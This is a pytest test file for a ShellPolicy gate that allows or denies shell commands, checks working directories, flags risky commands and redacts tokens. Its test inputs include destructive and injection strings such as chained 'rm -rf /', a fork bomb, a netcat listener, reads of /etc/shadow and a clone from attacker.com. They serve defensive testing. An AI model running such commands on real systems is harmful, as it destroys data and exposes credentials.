"""Tests for ShellPolicy — allow/deny rules, timeout, redaction.

Covers:
- Unit: allow patterns (git, python, pytest, etc.)
- Unit: deny patterns (sudo, rm -rf /, fork bomb, etc.)
- Unit: working-directory constraint enforcement
- Unit: risk audit → AUDIT verdict for dangerous-but-allowed commands
- Unit: token redaction on command strings and captured output
- Unit: default policy singleton creation and env-var gating
- Failure injection: shell disabled by default
- Failure injection: command matching deny pattern despite allow match
"""

from __future__ import annotations

import pytest

from src.codex.cognitive_brain.shell_policy import (
    PolicyVerdict,
    ShellPolicy,
    get_default_policy,
    reset_default_policy,
)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _policy(**kw) -> ShellPolicy:
    return ShellPolicy(**kw)


ADVERSARIAL_VECTORS = (
    ("command_chaining", "git status; rm -rf /"),
    ("logical_and", "git status && malicious"),
    ("logical_or", "git status || malicious"),
    ("pipe_chaining", "git log | sh"),
    ("command_substitution", "echo $(rm -rf /)"),
    ("backtick_substitution", "echo `malicious`"),
    ("newline_chaining", "git\nmalicious"),
    ("output_redirection", "git status > /etc/passwd"),
    ("input_redirection", "cat < /etc/shadow"),
    ("error_redirection", "git 2> /dev/null && rm -rf /"),
    ("subshell_grouping", "git && (rm -rf /)"),
    ("brace_grouping", "git && { rm -rf /; }"),
    ("background_execution", "malicious &"),
    ("double_redirection", "git status 2>&1"),
)


# ---------------------------------------------------------------------------
# Allow pattern tests
# ---------------------------------------------------------------------------


class TestAllowPatterns:
    def test_git_status_allowed(self) -> None:
        p = _policy()
        d = p.gate("git status")
        assert d.allowed

    def test_pytest_allowed(self) -> None:
        p = _policy()
        d = p.gate("pytest tests/")
        assert d.allowed

    def test_python_script_allowed(self) -> None:
        p = _policy()
        d = p.gate("python scripts/ci/foo.py")
        assert d.allowed

    def test_pip_install_allowed(self) -> None:
        p = _policy()
        d = p.gate("pip install -r requirements.txt")
        assert d.allowed

    def test_ruff_check_allowed(self) -> None:
        p = _policy()
        d = p.gate("ruff check src/")
        assert d.allowed

    def test_grep_allowed(self) -> None:
        p = _policy()
        d = p.gate("grep -r 'foo' src/")
        assert d.allowed


# ---------------------------------------------------------------------------
# Deny pattern tests
# ---------------------------------------------------------------------------


class TestDenyPatterns:
    def test_sudo_always_denied(self) -> None:
        p = _policy()
        d = p.gate("sudo apt-get install vim")
        assert d.verdict == PolicyVerdict.DENY

    def test_rm_rf_root_denied(self) -> None:
        p = _policy()
        d = p.gate("rm -rf /")
        assert d.verdict == PolicyVerdict.DENY

    def test_fork_bomb_denied(self) -> None:
        p = _policy()
        d = p.gate(":(){ :|:& };:")
        assert d.verdict == PolicyVerdict.DENY

    def test_netcat_denied(self) -> None:
        p = _policy()
        d = p.gate("nc -lvp 4444")
        assert d.verdict == PolicyVerdict.DENY

    def test_deny_overrides_default_enabled(self) -> None:
        """Even with default_shell_enabled=True, deny patterns still fire."""
        p = _policy(default_shell_enabled=True)
        d = p.gate("sudo chmod 777 /etc/passwd")
        assert d.verdict == PolicyVerdict.DENY


# ---------------------------------------------------------------------------
# Unknown command (no allow/deny match)
# ---------------------------------------------------------------------------


class TestUnknownCommands:
    def test_unknown_command_denied_by_default(self) -> None:
        p = _policy()
        d = p.gate("some_custom_binary --flag")
        assert d.verdict == PolicyVerdict.DENY

    def test_unknown_command_allowed_when_default_enabled(self) -> None:
        p = _policy(default_shell_enabled=True)
        d = p.gate("some_custom_binary --flag")
        assert d.allowed


# ---------------------------------------------------------------------------
# Working-directory constraint
# ---------------------------------------------------------------------------


class TestWorkingDirectoryConstraint:
    def test_allowed_cwd_passes(self) -> None:
        p = _policy(working_dir_allowlist=["/repo", "/workspace"])
        d = p.gate("git status", cwd="/repo/subdir")
        assert d.allowed

    def test_disallowed_cwd_denied(self) -> None:
        p = _policy(working_dir_allowlist=["/repo"])
        d = p.gate("git status", cwd="/tmp/evil")
        assert d.verdict == PolicyVerdict.DENY
        assert "cwd_violation" in d.risk_flags

    def test_no_cwd_allowlist_any_dir_ok(self) -> None:
        p = _policy()
        d = p.gate("git status", cwd="/arbitrary/path")
        assert d.allowed

    def test_cwd_none_with_allowlist_passes(self) -> None:
        p = _policy(working_dir_allowlist=["/repo"])
        # cwd=None means no enforcement
        d = p.gate("git status", cwd=None)
        assert d.allowed


# ---------------------------------------------------------------------------
# Risk audit → AUDIT verdict
# ---------------------------------------------------------------------------


class TestRiskAudit:
    def test_rm_rf_subdir_is_audit(self) -> None:
        p = _policy()
        d = p.gate("rm -rf build/")
        assert d.verdict == PolicyVerdict.AUDIT
        assert "recursive_delete" in d.risk_flags

    def test_output_redirect_is_denied(self) -> None:
        """Output redirection (>) is blocked to prevent shell metacharacter bypasses.
        
        Note: Prior design allowed this with AUDIT verdict, but the P0 security
        hardening requires blocking all shell metacharacters unconditionally to
        prevent bypass attacks like "git status; rm -rf /" matching "git *".
        """
        p = _policy()
        d = p.gate("git log > /tmp/log.txt")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_force_flag_is_audit(self) -> None:
        p = _policy()
        d = p.gate("git push --force")
        assert d.verdict == PolicyVerdict.AUDIT
        assert "force_flag" in d.risk_flags
# ---------------------------------------------------------------------------
# Token redaction
# ---------------------------------------------------------------------------


class TestRedaction:
    def test_github_pat_redacted(self) -> None:
        p = _policy()
        raw = "git clone https://ghp_abcdefghijklmnopqrstuvwxyz01234567@github.com/repo"
        safe = p.redact(raw)
        assert "ghp_" not in safe
        assert "[REDACTED]" in safe

    def test_codex_master_key_redacted(self) -> None:
        p = _policy()
        raw = "curl -H CODEX_MASTER_KEY=supersecret123 https://api.example.com"
        safe = p.redact(raw)
        assert "supersecret123" not in safe

    def test_password_flag_redacted(self) -> None:
        p = _policy()
        raw = "mysql --password myS3cr3tP@ss"
        safe = p.redact(raw)
        assert "myS3cr3tP@ss" not in safe

    def test_clean_command_unchanged(self) -> None:
        p = _policy()
        raw = "git status --short"
        assert p.redact(raw) == raw

    def test_gate_safe_command_is_redacted(self) -> None:
        """GateDecision.safe_command must not contain raw tokens."""
        p = _policy()
        raw_cmd = "git clone --token ****** /tmp/repo"
        d = p.gate(raw_cmd)
        assert "[REDACTED]" in d.safe_command


# ---------------------------------------------------------------------------
# Policy properties
# ---------------------------------------------------------------------------


class TestPolicyProperties:
    def test_default_timeout_ceiling(self) -> None:
        p = _policy()
        assert p.timeout_ceiling_s > 0

    def test_custom_timeout_ceiling(self) -> None:
        p = _policy(timeout_ceiling_s=30.0)
        assert p.timeout_ceiling_s == 30.0

    def test_default_max_retries(self) -> None:
        p = _policy()
        assert p.max_retries >= 1

    def test_custom_max_retries(self) -> None:
        p = _policy(max_retries=0)
        assert p.max_retries == 0

    def test_denied_command_has_zero_retries(self) -> None:
        p = _policy()
        d = p.gate("sudo rm -rf /")
        assert d.max_retries == 0

    def test_allowed_command_timeout_matches_policy(self) -> None:
        p = _policy(timeout_ceiling_s=60.0)
        d = p.gate("git status")
        assert d.timeout_s == 60.0


# ---------------------------------------------------------------------------
# GateDecision helpers
# ---------------------------------------------------------------------------


class TestGateDecision:
    def test_allowed_property_true_for_allow(self) -> None:
        p = _policy()
        d = p.gate("git status")
        assert d.allowed is True

    def test_allowed_property_true_for_audit(self) -> None:
        p = _policy()
        d = p.gate("rm -rf build/")
        assert d.allowed is True

    def test_allowed_property_false_for_deny(self) -> None:
        p = _policy()
        d = p.gate("sudo reboot")
        assert d.allowed is False

    def test_to_dict_contains_verdict(self) -> None:
        p = _policy()
        d = p.gate("git status")
        data = d.to_dict()
        assert "verdict" in data
        assert data["verdict"] == PolicyVerdict.ALLOW.value


# ---------------------------------------------------------------------------
# Default policy singleton
# ---------------------------------------------------------------------------


class TestDefaultPolicySingleton:
    def setup_method(self) -> None:
        reset_default_policy()

    def teardown_method(self) -> None:
        reset_default_policy()

    def test_get_default_policy_returns_instance(self) -> None:
        p = get_default_policy()
        assert isinstance(p, ShellPolicy)

    def test_get_default_policy_singleton(self) -> None:
        p1 = get_default_policy()
        p2 = get_default_policy()
        assert p1 is p2

    def test_default_policy_denies_unknown_without_env(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("COGNITIVE_BRAIN_ALLOW_SHELL", raising=False)
        reset_default_policy()
        p = get_default_policy()
        d = p.gate("some_unknown_binary")
        assert d.verdict == PolicyVerdict.DENY

    def test_default_policy_allows_unknown_with_env(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("COGNITIVE_BRAIN_ALLOW_SHELL", "true")
        reset_default_policy()
        p = get_default_policy()
        d = p.gate("some_unknown_binary --flag")
        assert d.allowed


# ---------------------------------------------------------------------------
# Shell metacharacter detection tests
# ---------------------------------------------------------------------------


class TestShellMetacharacterBlocking:
    """Tests for shell metacharacter detection — prevents chaining/redirection attacks."""

    @pytest.mark.parametrize(("label", "command"), ADVERSARIAL_VECTORS)
    def test_all_adversarial_vectors_denied(self, label: str, command: str) -> None:
        """Every documented adversarial shell-control vector must be denied."""
        p = _policy()
        d = p.gate(command)
        assert d.verdict == PolicyVerdict.DENY, label
        assert "shell metacharacter" in d.reason.lower()
        assert "shell_metacharacter_detected" in d.risk_flags

    def test_semicolon_chaining_denied(self) -> None:
        """Semicolon (;) enables command chaining and must be blocked."""
        p = _policy()
        d = p.gate("git status; rm -rf /")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_logical_and_chaining_denied(self) -> None:
        """Logical AND (&&) enables conditional command chaining."""
        p = _policy()
        d = p.gate("git clone https://repo && malicious_command")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_logical_or_chaining_denied(self) -> None:
        """Logical OR (||) enables fallback command chaining."""
        p = _policy()
        d = p.gate("git status || rm -rf /")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_pipe_operator_denied(self) -> None:
        """Pipe (|) enables data chaining between commands."""
        p = _policy()
        d = p.gate("cat file | rm -rf /")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_background_execution_denied(self) -> None:
        """Single ampersand (&) enables background execution chaining."""
        p = _policy()
        d = p.gate("git clone https://attacker.com/evil & rm -rf /")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_newline_chaining_denied(self) -> None:
        """Newline (\n) enables command chaining across lines."""
        p = _policy()
        d = p.gate("git status\nrm -rf /")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_carriage_return_chaining_denied(self) -> None:
        """Carriage return (\r) enables command chaining."""
        p = _policy()
        d = p.gate("git status\rrm -rf /")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_dollar_substitution_denied(self) -> None:
        """Dollar sign command substitution $(...) enables injection."""
        p = _policy()
        d = p.gate("git $(rm -rf /)")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_backtick_substitution_denied(self) -> None:
        """Backticks enable command substitution and injection."""
        p = _policy()
        d = p.gate("git `rm -rf /`")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_subshell_parens_denied(self) -> None:
        """Parentheses (...) enable subshell command execution."""
        p = _policy()
        d = p.gate("git (rm -rf /)")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_brace_expansion_denied(self) -> None:
        """Braces {...} enable brace expansion and multiple commands."""
        p = _policy()
        d = p.gate("git {status,clone}")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_output_redirection_denied(self) -> None:
        """Output redirection (>) enables data exfiltration."""
        p = _policy()
        d = p.gate("git status > /tmp/output")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_input_redirection_denied(self) -> None:
        """Input redirection (<) enables reading arbitrary files."""
        p = _policy()
        d = p.gate("cat < /etc/passwd")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_stderr_redirection_denied(self) -> None:
        """Stderr redirection (2>) enables output manipulation."""
        p = _policy()
        d = p.gate("git status 2> /tmp/error")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_allow_pattern_does_not_bypass_metacharacter_deny(self) -> None:
        """Metacharacter denial must win even when an allow glob would match."""
        p = _policy(allow_patterns=["git *"], default_shell_enabled=True)
        d = p.gate("git status; rm -rf /")
        assert d.verdict == PolicyVerdict.DENY
        assert "shell metacharacter" in d.reason.lower()

    def test_allowed_command_without_metacharacters(self) -> None:
        """Allowed commands without metacharacters should pass."""
        p = _policy()
        d = p.gate("git status --porcelain")
        assert d.allowed

    def test_allowed_command_with_dash_not_pipe(self) -> None:
        """Dashes in arguments (e.g., --option) should not trigger pipe detection."""
        p = _policy()
        d = p.gate("python --version")
        assert d.allowed

    def test_allowed_python_with_args(self) -> None:
        """Python with complex arguments should pass if no metacharacters."""
        p = _policy()
        d = p.gate("python -m pytest tests/")
        assert d.allowed
